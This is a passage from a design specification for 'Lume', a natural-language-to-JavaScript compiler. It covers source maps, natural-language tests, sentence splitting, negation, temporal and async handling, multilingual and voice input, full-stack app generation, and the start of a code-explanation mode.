When a compiled program throws an error, the stack trace should reference the English source line, not the generated JavaScript line. This requires source maps.

The compiler must generate a `.lume.map` file (standard source map format) that maps:
- English sentence (line number in `.lume` file) -> Generated JavaScript (line number in `.js` output)

When an error occurs at runtime:
```
Error: Cannot read property 'name' of undefined
  at app.lume:7  "show the user's name"
  (compiled to app.js:23)
```

The developer sees their English line, not `app.js:23`. This is how TypeScript source maps work — same concept, applied to natural language.

`lume build --sourcemap` generates the map file. Should be on by default in development mode.

### 7. Natural Language Testing

Intent blocks from the main Lume spec must work in English Mode. Tests written in natural language compile alongside the program:

```
mode: english

to calculate_total(items):
  add up all the prices in items
  return the total

test "calculate_total works correctly":
  given items are [{name: "book", price: 10}, {name: "pen", price: 5}]
  when I calculate the total of items
  then the result should be 15

test "calculate_total handles empty list":
  given items are []
  when I calculate the total of items
  then the result should be 0
```

The test keywords ("given," "when," "then") map to setup, execution, and assertion AST nodes. This follows the Given-When-Then (Gherkin) pattern, which is already designed for human-readable testing.

`lume test app.lume` runs the tests. Test results show in natural language:
```
PASS: "calculate_total works correctly"
FAIL: "calculate_total handles empty list" — expected 0, got undefined
```

### 8. Performance Boundaries

**AI Call Batching:**
When multiple lines fail Layer A and need Layer B resolution, batch them into a single AI request instead of making separate API calls for each line. Send: "Resolve these 15 lines in the context of this project" as one request, not 15 individual requests.

**Cost Transparency:**
After compilation, show a summary:
```
Compiled app.lume (47 lines)
  Pattern matches (Layer A): 38 lines (instant)
  AI resolutions (Layer B):  9 lines (batched into 1 API call)
  Estimated cost: $0.002
  Compile time: 1.8 seconds
```

**Performance Targets:**
- Layer A resolution: < 1ms per line
- Layer B resolution (batched): < 3 seconds for up to 50 lines
- Total compile time for a 500-line file: < 10 seconds
- If compile time exceeds 30 seconds, show a progress indicator

### 9. Regression Protection

When the pattern library is updated (new patterns, modified patterns, or Auto-Correct dictionary changes), existing programs must not silently change behavior.

**The Compile Lock File (`.lume/compile-lock.json`)** handles this:
- Every successful compilation locks the exact resolution for every line
- On recompilation, locked resolutions are used — new patterns don't apply to old lines unless the source changes
- `lume build --fresh` forces full re-resolution (developer explicitly opts in to new pattern behavior)
- `lume build --check` compiles without writing output — just verifies all lines still resolve the same way. Returns exit code 0 if unchanged, exit code 1 if any line would resolve differently.

This is how you prevent the 1% that destroys everything. The lock file is the insurance policy.

### 10. Sentence Boundary Detection

Natural language doesn't have semicolons. People chain multiple operations into a single sentence with "and," "then," "also," commas, and run-on structures. The compiler must split multi-operation sentences into individual AST nodes.

**Splitting rules:**

| Connector | Example | Splits Into |
|-----------|---------|-------------|
| "and" (between verbs) | "get the user and show their name" | 2 ops: get user, show name |
| "then" | "save the data, then redirect to home" | 2 ops: save, redirect (sequential) |
| "also" | "show the name, also log the timestamp" | 2 ops: show, log (parallel) |
| Comma + verb | "fetch the data, filter it, sort by date" | 3 ops: fetch, filter, sort (sequential) |
| "and" (within a noun) | "get the user's name and email" | 1 op: get user.name AND user.email (NOT 2 ops) |

The critical distinction: "and" between two **verbs** splits into multiple operations. "And" between two **nouns** stays as one operation with multiple fields. The compiler must do part-of-speech analysis to determine this.

**Implementation:** Add `src/intent-resolver/sentence-splitter.js` that runs before pattern matching. It breaks compound sentences into atomic operations, then each atomic operation goes through the Tolerance Chain independently.

### 11. Negation Detection

Negation flips the meaning of an operation entirely. Getting this wrong means the program does the **exact opposite** of what the developer intended.

**Negation patterns to detect:**

| Pattern | Example | Meaning |
|---------|---------|---------|
| "don't" / "do not" | "don't show the password" | Exclude/hide password |
| "never" | "never delete user data" | Constraint: delete is forbidden on user data |
| "not" | "users who are not admins" | Filter: admin = false |
| "skip" | "skip the inactive users" | Filter: active = true |
| "except" / "except for" | "show everything except the password" | Include all fields minus password |
| "unless" | "save the data unless validation fails" | Conditional: if validation passes, save |
| "without" | "create the user without sending an email" | Perform create, suppress email side effect |
| "hide" / "remove" | "hide the delete button" | Set visibility to false |
| "prevent" / "block" | "prevent duplicate submissions" | Add guard logic |
| "no" (before noun) | "no errors allowed" | Add validation that errors = 0 |

**Implementation:** The negation detector runs after sentence splitting but before pattern matching. It identifies negation words, determines their scope (what noun/verb they negate), and tags the operation with a negation flag. The pattern matcher then applies the inversion.

**Critical edge case:** Double negation. "Don't not show the password" = show the password. "It's not impossible" = it's possible. Double negation must resolve correctly, not cancel out silently.

### 12. Temporal Expression Resolution

Time references in natural language are always relative to when the code runs, not when it was written. The compiler must generate dynamic date calculations.

**Temporal expression mappings:**

| Expression | Generated Code |
|-----------|---------------|
| "today" | `new Date().setHours(0,0,0,0)` |
| "yesterday" | `new Date(Date.now() - 86400000)` |
| "last week" | `new Date(Date.now() - 7 * 86400000)` |
| "this month" | `new Date(new Date().getFullYear(), new Date().getMonth(), 1)` |
| "30 days ago" | `new Date(Date.now() - 30 * 86400000)` |
| "next Friday" | Dynamic weekday calculation |
| "in 2 hours" | `new Date(Date.now() + 2 * 3600000)` |
| "at 9am tomorrow" | Combined date + time calculation |
| "every Monday" | Cron/interval scheduling |
| "between March and June" | Date range comparison |

**Implementation:** Add `src/intent-resolver/temporal-resolver.js` that detects temporal phrases, extracts the relative time reference, and generates the appropriate Date calculation as an AST node. The temporal resolver should use a well-tested date library (like `date-fns` or Temporal API) in the generated JavaScript, not manual millisecond math, to handle timezone and daylight saving edge cases.

### 13. Complex Boolean Logic

Natural language uses "and," "or," "but," "unless," and other connectors to build compound conditions. The compiler must parse these into correct boolean expressions.

**Natural language -> Boolean expression mapping:**

| Natural Language | Boolean Expression |
|-----------------|-------------------|
| "if the user is logged in and is an admin" | `user.loggedIn && user.isAdmin` |
| "if the price is less than 10 or the item is on sale" | `price < 10 \|\| item.onSale` |
| "if the user is active but not suspended" | `user.active && !user.suspended` |
| "unless the form is invalid" | `if (!form.invalid)` or `if (form.valid)` |
| "either the email or the phone must be provided" | `email \|\| phone` (validation) |
| "all of these must be true: name, email, password" | `name && email && password` |
| "none of these should be empty" | `!isEmpty(name) && !isEmpty(email) && !isEmpty(password)` |
| "if A and B, but not if C" | `(A && B) && !C` |

**Operator precedence in natural language:** "and" binds tighter than "or" (same as `&&` vs `||`). "But not" is AND + NOT. "Unless" inverts the entire condition. Parenthetical grouping uses phrases like "either...or" and "both...and."

### 14. Async Auto-Detection

The compiler must automatically determine if an operation is synchronous or asynchronous based on what it does, because developers writing in English will NOT say "asynchronously."

**Async operation detection:**

| Operation Type | Examples | Generated Code |
|---------------|----------|----------------|
| Network requests | "get data from the API," "fetch the weather" | `await fetch(...)` |
| Database queries | "get users from the database," "save to DB" | `await db.query(...)` |
| File I/O | "read the config file," "write to log" | `await fs.readFile(...)` |
| Timers/delays | "wait 3 seconds," "pause for a moment" | `await delay(3000)` |
| AI operations | "ask the AI to summarize" | `await ask(...)` |
| Math/logic | "add 5 to the total," "check if active" | Synchronous (no await) |
| Variable assignment | "set the name to 'John'" | Synchronous |
| UI updates | "show the result," "hide the button" | Synchronous (unless data-dependent) |

**Parallel detection:** "Get the weather and the news at the same time" -> `await Promise.all([getWeather(), getNews()])`. Key phrases: "at the same time," "simultaneously," "in parallel," "meanwhile," "while that's happening."

**Sequential detection:** "Get the user, then show their name" -> `const user = await getUser(); show(user.name)`. Key phrases: "then," "after that," "once that's done," "next."

The function containing any async operation must itself be marked `async`. The compiler should propagate `async` up through the call chain.

### 15. Pronoun Scope Rules

Pronouns ("it," "they," "their," "this," "that") are resolved by the Context Engine's short-term memory. But without scope boundaries, long programs become unpredictable.

**Scope rules:**

1. **Function boundary = pronoun reset.** Pronouns inside a function cannot refer to variables from outside that function (unless explicitly passed as parameters).
2. **20-line distance warning.** If a pronoun is more than 20 lines away from its likely referent, the compiler shows a warning: `"Line 45: 'it' may refer to 'user' from line 12. Consider using 'the user' explicitly."`
3. **Explicit overrides ambiguity.** If the developer writes the actual name instead of a pronoun, that always wins. "Show the user's email" is always clearer than "show their email."
4. **Multiple possible referents = ask.** If "it" could refer to "user" or "order" (both in scope), ask: `"Line 15: 'it' could refer to 'user' (line 8) or 'order' (line 12). Which one?"`
5. **Loop scope.** Inside a loop, "it" refers to the current iteration item. "For each user, show their name" — "their" is the current user, not a global reference.

### 16. Cross-File References in English Mode

English Mode files must support importing from and exporting to other files. The Context Engine must track what's available across the project.

**Natural language import patterns:**

| Natural Language | Resolves To |
|-----------------|-------------|
| "bring in calculate_total from utils" | `use "calculate_total" from "./utils"` |
| "use the helper functions from math-tools" | `use "*" from "./math-tools"` |
| "get the User model from models" | `use "User" from "./models"` |
| "import everything from the API module" | `use "*" from "./api"` |

**Natural language export patterns:**

| Natural Language | Resolves To |
|-----------------|-------------|
| "make this function available to other files" | `expose calculate_total` |
| "share the results" | `expose results` |
| "this module provides: calculate, format, validate" | `expose calculate, format, validate` |

The Context Engine must scan the project's other files to know what's available for import. When a developer says "use the calculate function," the engine should check all project files for a function named "calculate" and auto-resolve the file path.

### 17. Error Message Standards

Every error, warning, and informational message from the compiler must follow a consistent format:

```
[LUME-E001] Unresolvable input
  Line 7: "flurb the data into the schnozzle"
  Attempted: Pattern match (no match), Fuzzy match (no match), AI resolution (12% confidence — too low)
  Suggestion: Try rephrasing. Similar known operations:
    - "save the data to the database"
    - "send the data to [url]"
    - "show the data on the page"
```

**Error code format:**
- `LUME-E###` — Errors (compilation fails)
- `LUME-W###` — Warnings (compilation succeeds but something is suspicious)
- `LUME-I###` — Informational (auto-corrections, AI resolutions, performance notes)

**Standard error catalog (partial):**

| Code | Category | Message |
|------|----------|---------|
| LUME-E001 | Unresolvable | Input could not be understood by any resolution layer |
| LUME-E002 | Conflict | Two instructions contradict each other |
| LUME-E003 | Security | Operation blocked by security layer |
| LUME-E004 | Type mismatch | Value doesn't match expected type from context |
| LUME-E005 | Missing reference | Referenced variable/function doesn't exist in any scope |
| LUME-W001 | Low confidence | AI resolution between 50-79% — compiled with confirmation |
| LUME-W002 | Distant pronoun | Pronoun reference is >20 lines from probable referent |
| LUME-W003 | Ambiguous pronoun | Multiple possible referents for pronoun |
| LUME-W004 | Destructive | Operation will delete/destroy data — confirmed by user |
| LUME-I001 | Auto-correct | Typo corrected before compilation |
| LUME-I002 | Pattern learned | New pattern saved from user correction |
| LUME-I003 | AI resolution | Line resolved via Layer B with confidence score |

### 18. Language Version Declaration

As Lume evolves, the compiler behavior will change. A program written and tested against Milestone 7 must produce the same output after Milestone 13 is released.

**Version declaration format:**
```
mode: english
lume-version: 7

get the user's name and show it
```

**Rules:**
- If `lume-version` is declared, the compiler locks behavior to that version's pattern library, auto-correct dictionary, and resolution rules
- If `lume-version` is NOT declared, the compiler uses the latest version (current behavior)
- `lume build --version 7 app.lume` overrides the file declaration
- The compiler should warn if a file uses features from a newer version than declared: `"Warning: 'mode: natural' requires lume-version >= 8. Your file declares version 7."`
- Version declarations are optional — omitting them is fine for personal projects and experimentation. They're important for production code and team projects.

### 19. Collective Intelligence Layer

Individual learning (per-project pattern caches, autocorrect dictionaries) makes Lume smarter for one developer. Collective intelligence makes Lume smarter for EVERYONE.

**How it works:**

When a developer's correction or resolution is confirmed and works (the program compiles and runs correctly), the compiler can optionally contribute that pattern to a global anonymized pattern registry hosted at `lume-lang.com/patterns`.

**What gets shared (anonymized):**
- The natural language input pattern (e.g., "grab the data from the API")
- The resolved AST node type (e.g., fetch operation)
- The confidence score from the original resolution
- The language (English, Spanish, etc.)
- Success/failure (did the compiled program work?)
- NO project-specific data: no variable names, no file paths, no code content, no credentials, nothing identifiable

**What the registry does:**
- Aggregates patterns across all Lume users worldwide
- When 100+ developers independently confirm the same natural language -> AST resolution, it gets promoted to the official pattern library in the next release
- Trending patterns are surfaced: "Last month, 2,400 developers used 'grab' as a synonym for 'get' — adding to Layer A"
- Language-specific patterns grow organically: French developers teach the compiler French idioms, Japanese developers teach Japanese programming phrases
- The Auto-Correct dictionary grows the same way: if 5,000 developers type "db" to mean "database," it becomes a global alias

**Privacy and control:**
- Contributions are **opt-in** — `lume config set telemetry.contribute_patterns true`
- Default is OFF — privacy first. The developer explicitly chooses to share.
- Pattern downloads are separate from contributions — you can receive community patterns without contributing your own
- `lume config set telemetry.receive_patterns true` to receive new patterns from the registry
- All shared data is anonymized — there is zero way to trace a pattern back to a specific project, developer, or company
- Enterprise users can disable both directions entirely: `lume config set telemetry.mode off`
- A local-only mode exists for air-gapped or classified environments

**The flywheel effect:**
More users -> more patterns -> better Layer A coverage -> fewer AI calls needed -> faster compile times -> lower costs -> more users. The language literally gets smarter the more people use it. After a year of community usage, Layer A might cover 95% of common sentences — meaning most programs compile instantly without any AI calls at all.

**CLI commands:**
```bash
lume patterns list                    # Show locally learned patterns
lume patterns contribute              # Upload anonymized patterns to registry
lume patterns sync                    # Download latest community patterns
lume patterns stats                   # Show community stats (total patterns, languages, contributors)
```

**Registry API (hosted at lume-lang.com):**
```
GET  /api/patterns/latest             # Latest community patterns since last sync
GET  /api/patterns/stats              # Global usage statistics
POST /api/patterns/contribute         # Submit anonymized patterns (authenticated)
GET  /api/patterns/language/{lang}    # Patterns for a specific language
```

### 20. Contextual AI Memory Across Sessions

The Context Engine currently tracks state within a single compilation. But developers work across multiple sessions — they come back tomorrow, next week, next month. The compiler should remember what it learned about the developer and the project across sessions.

**What to persist between sessions (in `.lume/context-memory.json`):**

1. **Developer style profile** — does this developer use formal language ("retrieve the database records") or casual ("grab the users")? Adapt pattern matching confidence thresholds accordingly.
2. **Project domain knowledge** — after scanning the project once, remember what domain it's in (e-commerce, healthcare, social media, etc.). This helps resolve ambiguity: "order" means a purchase order in e-commerce but a sort direction in a general utility.
3. **Frequently used operations** — if this developer writes database queries 80% of the time, bias ambiguous references toward database operations.
4. **Past resolution history** — when the developer last confirmed "grab" means "get," remember that permanently for this project, not just the current session.
5. **Error patterns** — if the developer consistently triggers LUME-W002 (distant pronoun), the compiler can proactively suggest explicit naming earlier.

**This is NOT user tracking.** All data stays in the local `.lume/` directory. Nothing is sent externally unless the developer opts into the Collective Intelligence Layer. This is the compiler getting better at understanding one specific developer over time — like how your phone keyboard learns your texting style.

### 21. Semantic Understanding Beyond Keywords

The current spec relies heavily on keyword matching ("get," "show," "save," "delete"). But real natural language expresses the same intent in hundreds of ways that don't use any of those keywords.

**Examples of intent expressed without standard keywords:**

| What someone might write | What they mean | Standard keyword equivalent |
|-------------------------|---------------|---------------------------|
| "I need the user's email" | get user.email | "get" |
| "put this on the screen" | show(data) | "show" |
| "hang onto this data" | save(data) | "save" |
| "get rid of the old records" | delete(records) | "delete" |
| "what's the user's name?" | return user.name | "get" |
| "throw this in the database" | store(data) | "save" |
| "pull up the dashboard" | navigate("/dashboard") | "show" / "go to" |
| "fire off an email" | sendEmail() | "send" |
| "spin up a server" | startServer() | "create" / "start" |
| "crunch the numbers" | calculate() | "calculate" |
| "keep an eye on this" | monitor() | "monitor" |
| "patch things up if it breaks" | heal() | "heal" |

**Implementation:** Expand the pattern library to include colloquial, informal, and idiomatic expressions — not just formal programming-adjacent language. The AI resolver (Layer B) handles the truly unusual phrasing, but Layer A should cover the common informal variants so they resolve instantly without an AI call.

Build a **synonym ring** for each core operation:
- **get:** fetch, retrieve, grab, pull, obtain, access, look up, find, query, "I need," "what's the," "give me"
- **show:** display, render, present, print, output, "put on screen," "let me see"
- **save:** store, persist, write, keep, preserve, "hang onto," "put in the database"
- **delete:** remove, destroy, erase, clear, wipe, purge, "get rid of," "throw away"
- **create:** make, build, generate, construct, instantiate, "spin up," set up
- **send:** dispatch, fire, emit, transmit, broadcast, "fire off," deliver
- **calculate:** compute, process, evaluate, "crunch," tally, "add up," "figure out"

The synonym ring is checked during Layer A pattern matching before falling through to fuzzy matching or AI resolution.

---

## MILESTONE 8: MULTILINGUAL MODE

### What It Is

Extend the Intent Resolver to accept input in any human language. French, Spanish, Mandarin, Arabic, Hindi, Japanese, Portuguese, German — any language the AI model understands.

### How It Works

1. **Auto-detect the input language** — no configuration needed
2. **Resolve intent identically regardless of language** — the same program written in French and English produces the same AST and the same JavaScript output
3. **Support mixed-language files** — a developer can write some lines in English and some in Spanish in the same file. Each line is resolved independently.

### Implementation

**Layer A (Pattern Matching):** Expand the pattern library with translations of each pattern. Start with the top 10 languages by developer population:

1. English
2. Mandarin Chinese
3. Spanish
4. Hindi
5. French
6. Portuguese
7. Arabic
8. Japanese
9. German
10. Korean

Each pattern gets translated versions. The pattern matcher checks all languages in parallel.

**Example — the same pattern in multiple languages:**

| Language | Input | Resolves To |
|----------|-------|-------------|
| English | `get the user's name` | `user.name` |
| French | `obtenir le nom de l'utilisateur` | `user.name` |
| Spanish | `obtener el nombre del usuario` | `user.name` |
| Mandarin | `获取用户的名字` | `user.name` |
| Arabic | `الحصول على اسم المستخدم` | `user.name` |
| Japanese | `ユーザーの名前を取得する` | `user.name` |

Same AST output. Same JavaScript. The language you write in does not affect the compiled result.

**Layer B (AI Resolution):** Already multilingual — LLMs understand all major languages natively. The AI resolution layer requires no changes for multilingual support. Just ensure the context data (data model, scope) is passed in a language-neutral format (field names stay as defined in the project, regardless of what language the instructions are written in).

### New File to Create

```
src/
  intent-resolver/
    pattern-library-i18n.js  # Translated pattern dictionaries for top 10 languages
    lang-detect.js           # Auto-detect input language per line
```

### File Format

```
mode: natural

obtener todos los usuarios registrados este mes
mostrar sus nombres en una lista

when the delete button is clicked:
  supprimer l'utilisateur selectionne
  afficher "Utilisateur supprime" pendant 3 secondes
```

The `mode: natural` declaration enables multilingual mode. `mode: english` restricts to English only (faster pattern matching). Standard `.lume` files without a mode declaration use the existing Lume syntax (unchanged, fully backward compatible).

### Error Messages

Error messages should be returned in the same language the user is writing in. If the input is French, errors are in French. If mixed, default to the language used most in the file.

### Acceptance Criteria

- [ ] `mode: natural` file header enables multilingual input
- [ ] Auto-detection of input language per line (no manual config)
- [ ] Pattern library covers top 10 languages with 50+ patterns each
- [ ] Mixed-language files compile correctly
- [ ] Error messages output in the detected language
- [ ] Identical AST/JS output regardless of input language
- [ ] **Auto-Correct:** Multilingual spell check and context-aware correction for all 10 supported languages (not just English)
- [ ] **Auto-Correct:** Multilingual autocorrect dictionaries (`.lume/autocorrect-dictionary-{lang}.json`) per language per project
- [ ] **Compile Lock:** Lock file format extended to include language metadata per resolution

---

## MILESTONE 9: VOICE-TO-CODE

### What It Is

Spoken language as compiler input. A developer speaks into a microphone, the speech is transcribed, and the transcription is fed directly into the Intent Resolver from Milestones 7-8. The compiled output is working JavaScript.

### How It Works

```
Voice Input -> Speech-to-Text (Whisper / browser API) -> Intent Resolver -> Lume AST -> Transpiler -> JavaScript
```

The hard part (understanding what the words mean) is already solved by the Intent Resolver. This milestone adds a transcription front-end.

### Implementation

**Option A: Browser-Based (for the playground / IDE) — BUILD THIS FIRST**
- Use the Web Speech API (`SpeechRecognition`) for real-time transcription in the browser
- A microphone button in the Lume playground/IDE that toggles dictation mode
- Transcribed text appears in the editor in real-time as the user speaks
- User can edit the transcription before compiling, or compile on the fly

**Option B: CLI-Based**
- `lume listen` command starts a microphone session
- Uses OpenAI Whisper (local or API) for high-accuracy transcription
- Transcribed text is saved to a `.lume` file with `mode: natural` header
- User reviews the file and runs `lume build` as normal

**Option C: Mobile (future — ties into React Native ecosystem app)**
- Tap-to-speak interface
- Dictate an entire program while walking
- Review and compile from phone
- DO NOT build this now — it will be a separate project when ready

### Voice-Specific Handling

Speech introduces challenges that typed text doesn't have:

1. **Punctuation** — speech doesn't naturally include colons, brackets, or indentation. The Intent Resolver should infer structure from verbal cues like "when," "if," "then," "next," "inside that," "end," "that's it"
2. **Corrections** — "no wait, I meant..." or "scratch that" should undo the last transcribed line
3. **Pauses** — a long pause (2+ seconds) could indicate a new logical block (like a paragraph break)
4. **Numbers vs words** — "five" and "5" should resolve identically
5. **Variable naming** — when the user says "call it user count," the system creates a variable named `userCount`

### Multilingual Voice

Because Milestone 8 already supports multilingual text, voice input in any language works automatically. Whisper supports 99 languages. A developer in Tokyo speaks Japanese, it transcribes to Japanese text, and the Intent Resolver compiles it.

### Acceptance Criteria

- [ ] Browser-based microphone input works in the Lume playground
- [ ] CLI `lume listen` command starts voice capture and produces a `.lume` file
- [ ] Verbal structural cues ("when," "if," "then") resolve to correct AST structure
- [ ] "Scratch that" / "undo" removes the last transcribed line
- [ ] Pause detection separates logical blocks
- [ ] Voice input in non-English languages produces correct output via Milestone 8
- [ ] **Offline:** Layer A (pattern matching) works fully offline — no internet required
- [ ] **Offline:** Layer B (AI resolution) queues unresolved lines when offline, marks them as "pending — will resolve when connected"
- [ ] **Offline:** Optional local LLM fallback (Ollama/Llama) can serve as offline Layer B substitute
- [ ] **Offline:** CLI voice mode falls back to offline speech engine when Whisper API is unavailable

---

## MILESTONE 10: VISUAL CONTEXT AWARENESS

### What It Is

Extend the Context Engine to understand visual layout and UI state. The compiler can resolve spatial and visual references in natural language — "put the form in the center," "make the header blue," "add a sidebar on the left."

### How It Works

The Context Engine (from Milestone 7) already tracks data models and variables. This milestone adds:

1. **UI Element Registry** — the compiler maintains a map of all UI elements in the current project (buttons, forms, headers, lists, modals, etc.) with their positions, styles, and relationships
2. **Spatial Resolution** — phrases like "on the left," "below the header," "next to the search bar" resolve to CSS/layout properties
3. **Style Resolution** — "make it bigger," "change the color to blue," "add some spacing" resolve to specific style changes relative to the current state
4. **Component Awareness** — "add a login form" generates a complete component (input fields, submit button, validation) based on common patterns

### Implementation

**UI Element Registry:**
```
Scans existing project files -> builds a map:
{
  elements: [
    { id: "header", type: "nav", position: "top", children: ["logo", "nav-links", "login-button"] },
    { id: "main-content", type: "section", position: "center", children: [] },
    { id: "footer", type: "footer", position: "bottom", children: ["copyright", "links"] }
  ]
}
```

**Natural Language -> Layout:**

| Input | Resolves To |
|-------|-------------|
| `put the form in the center of the page` | `display: flex; justify-content: center; align-items: center` on parent container |
| `add a sidebar on the left` | CSS Grid or Flexbox layout with sidebar column |
| `make the header sticky` | `position: sticky; top: 0` |
| `hide the login button when the user is logged in` | Conditional render based on auth state |
| `add some space between the cards` | `gap` property on parent grid/flex container |
| `make the text bigger` | Increase `font-size` relative to current value |

**Component Generation:**

When the user says "add a login form," the compiler generates a full component based on common patterns:
- Email/username input
- Password input
- Submit button
- Basic validation
- Error message display
- Connection to the project's auth system (if one exists in the Context Engine)

This isn't template-based — the Context Engine looks at the current project and generates a component that fits. If the project uses a specific design system, the generated component uses those styles.

### 3D Context (OPTIONAL — only if project uses Three.js/React Three Fiber)

If the project contains 3D dependencies (Three.js, React Three Fiber, or TrustGen integration), the Visual Context can extend to 3D space. This is an optional extension — skip it if no 3D libraries are detected in the project.

| Input | Resolves To |
|-------|-------------|
| `place the building next to the river` | 3D position calculation relative to existing meshes |
| `make the sky darker` | Environment lighting adjustment |
| `rotate the camera to face the entrance` | Camera transform with lookAt |
| `add trees along the road` | Instanced mesh generation along a path |

Do NOT spend time building 3D features unless the core 2D/CSS visual context is complete and passing tests first.

### Full-Stack App Generation (THE ULTIMATE GOAL)

Everything in Milestones 7-10 comes together here. This is the capability that makes people say "how has this not existed for 30 years."

When a developer describes an entire app in plain English, Lume generates ALL of it:

**Example input — complete app description:**
```
mode: english

this is a recipe sharing app

it has a login page with email and password
after login, show a dashboard with my saved recipes
each recipe has a title, ingredients list, steps, and a photo
I can create new recipes, edit them, and delete them
other users can browse recipes and save their favorites
add a search bar that filters recipes by ingredient
the app should work on phones and computers
```

**What Lume generates from this description:**

1. **Database schema:**
   - `users` table (id, email, password_hash, created_at)
   - `recipes` table (id, user_id, title, ingredients, steps, photo_url, created_at)
   - `favorites` table (user_id, recipe_id)
   - Proper foreign keys, indexes, and relationships

2. **Backend API:**
   - POST /api/auth/register, POST /api/auth/login, POST /api/auth/logout
   - GET /api/recipes, POST /api/recipes, PUT /api/recipes/:id, DELETE /api/recipes/:id
   - GET /api/recipes/search?ingredient=chicken
   - POST /api/favorites/:recipeId, DELETE /api/favorites/:recipeId
   - Authentication middleware, input validation, error handling

3. **Frontend screens:**
   - Login/register page with form validation
   - Dashboard with recipe grid/list
   - Recipe detail view
   - Create/edit recipe form with photo upload
   - Search bar with live filtering
   - Favorites collection
   - Responsive layout (works on phones and computers)

4. **Wiring:**
   - Frontend calls the API correctly
   - Authentication tokens stored and sent with requests
   - Loading states, error states, empty states
   - Navigation between screens

**How this works technically:**

The compiler processes the description in phases:

**Phase 1: Entity Extraction**
Read the description and identify the data entities and their relationships:
- "recipe has a title, ingredients list, steps, and a photo" -> Recipe entity with 4 fields
- "users can browse and save favorites" -> User entity, Favorite relationship (many-to-many)
- "login with email and password" -> User has email and password fields, needs auth

**Phase 2: Operation Extraction**
Identify what operations the user described:
- "create new recipes, edit them, and delete them" -> full CRUD on recipes
- "browse recipes" -> read-only list/search
- "save their favorites" -> create/delete on favorites
- "search by ingredient" -> filtered query

**Phase 3: UI Extraction**
Identify the screens and layout:
- "login page" -> auth screen
- "dashboard with my saved recipes" -> home screen with grid
- "search bar that filters" -> search component
- "work on phones and computers" -> responsive design

**Phase 4: Code Generation**
Generate the actual files using Milestone 7 (Intent Resolver) + Milestone 10 (Visual Context):
- Database migration files
- Express API route files
- React/HTML frontend files
- CSS for responsive layout
- Package.json with dependencies
- README with setup instructions

**Phase 5: Validation**
The Security Layer and Conflict Detection verify the generated app:
- Auth is properly implemented (passwords hashed, tokens validated)
- All CRUD operations have proper authorization checks
- No security vulnerabilities in the generated code
- The generated app actually runs

**CLI for full-stack generation:**
```bash
lume create app.lume                      # Generate full project from description
lume create app.lume --frontend react     # Specify frontend framework
lume create app.lume --frontend expo      # Generate React Native mobile app
lume create app.lume --backend express    # Specify backend framework (default)
lume create app.lume --database postgres  # Specify database (default: SQLite)
lume create app.lume --preview            # Show what would be generated without creating files
```

**The `--preview` flag is critical.** Before generating anything, the compiler shows:
```
[preview] app.lume — Full-stack app generation plan:

Database:
  - users (id, email, password_hash, created_at)
  - recipes (id, user_id, title, ingredients, steps, photo_url, created_at)
  - favorites (user_id, recipe_id)

API Endpoints:
  - POST /api/auth/register
  - POST /api/auth/login
  - GET  /api/recipes (list, with search)
  - POST /api/recipes (create, auth required)
  - PUT  /api/recipes/:id (update, owner only)
  - DELETE /api/recipes/:id (delete, owner only)
  - POST /api/favorites/:id (save, auth required)
  - DELETE /api/favorites/:id (unsave, auth required)

Frontend Screens:
  - /login — email + password form
  - /register — registration form
  - /dashboard — recipe grid with search bar
  - /recipe/:id — recipe detail view
  - /recipe/new — create recipe form
  - /recipe/:id/edit — edit recipe form
  - /favorites — saved recipes

Files to generate: 14 files
Estimated size: ~2,400 lines of code

Generate? (y/n/modify)
```

The developer reviews this plan, can modify it ("actually, add a comments section to recipes"), and then approves. The compiler generates everything.

**Iterative refinement after generation:**
Once the app is generated, the developer can refine it with additional Lume instructions:
```
mode: english

make the recipe cards show a thumbnail of the photo
add a rating system — users can rate recipes 1 to 5 stars
show the average rating on each recipe card
sort the dashboard by highest rated by default
add a "trending this week" section at the top
```

Each instruction modifies the existing generated app — it doesn't regenerate from scratch. The Context Engine knows what already exists and applies changes incrementally.

**This is how you build entire apps with Lume.** Describe what you want, review the plan, approve, then refine. No code. No frameworks to learn. No syntax to memorize. Just describe your app and it exists.

**Frontend framework support — what Lume generates for each target:**

| Target | What Gets Generated | Use Case |
|--------|-------------------|----------|
| `--frontend html` | Vanilla HTML/CSS/JS | Simple websites, no framework needed |
| `--frontend react` | React app with components | Web apps (default) |
| `--frontend expo` | React Native / Expo app | Mobile apps (iOS + Android) |
| `--frontend next` | Next.js app with SSR | Full-stack web apps with SEO |

The backend always generates Express + the specified database. The Intent Resolver handles the translation layer — the same English description produces different code depending on the target, but the app does the same thing regardless of target.

### Acceptance Criteria

- [ ] UI Element Registry scans project and maps all visual elements
- [ ] Spatial terms ("left," "center," "above," "below") resolve to correct CSS
- [ ] Style modifications ("bigger," "blue," "more spacing") are relative to current state
- [ ] "Add a [component]" generates contextually appropriate full components
- [ ] Changes are non-destructive — existing layout is preserved unless explicitly changed
- [ ] 3D spatial resolution works IF project has Three.js/3D dependencies (optional)
- [ ] **Full-Stack:** `lume create` generates database schema, API, and frontend from a plain English app description
- [ ] **Full-Stack:** `--preview` flag shows the full generation plan before creating any files
- [ ] **Full-Stack:** Entity extraction correctly identifies data models and relationships from natural language
- [ ] **Full-Stack:** Operation extraction identifies CRUD operations, auth requirements, and search/filter needs
- [ ] **Full-Stack:** Generated apps include proper authentication, authorization, validation, and error handling
- [ ] **Full-Stack:** Iterative refinement — additional Lume instructions modify the existing app without regenerating from scratch
- [ ] **Full-Stack:** Frontend target flags (`--frontend react`, `--frontend expo`, `--frontend html`, `--frontend next`) generate appropriate code
- [ ] **Full-Stack:** Generated apps actually run — the compiler validates the output before declaring success

---

## MILESTONE 11: REVERSE MODE (CODE-TO-LANGUAGE)

### What It Is

Flip the pipeline. Instead of human language -> code, take existing code and explain it in plain human language. Any JavaScript, TypeScript, or Lume file can be translated into a natural language explanation in whatever language the user speaks.

### How It Works

```
JavaScript/Lume Source -> AST Analysis -> Explanation Generator -> Plain Language Output
```

### Implementation

**Two output modes:**

**Mode A: Line-by-line annotation**
```
Input (JavaScript):
  const users = await db.query("SELECT * FROM users WHERE active = true");
  const names = users.map(u => u.name);
  console.log(names.join(", "));

Output (English):
  Line 1: Get all active users from the database
  Line 2: Extract just their names into a list
  Line 3: Show all the names separated by commas

Output (Spanish):
  Linea 1: Obtener todos los usuarios activos de la base de datos
  Linea 2: Extraer solo sus nombres en una lista
  Linea 3: Mostrar todos los nombres separados por comas
```

**Mode B: Summary explanation**
```
Input: [entire file]
Output: "This file connects to the database, gets all active users, and displays
         their names as a comma-separated list. It runs when the page loads."
```

### CLI Usage

```bash
lume explain app.js                    # Explain in English (default)
lume explain app.js --lang french      # Explain in French
lume explain app.js --lang japanese    # Explain in Japanese
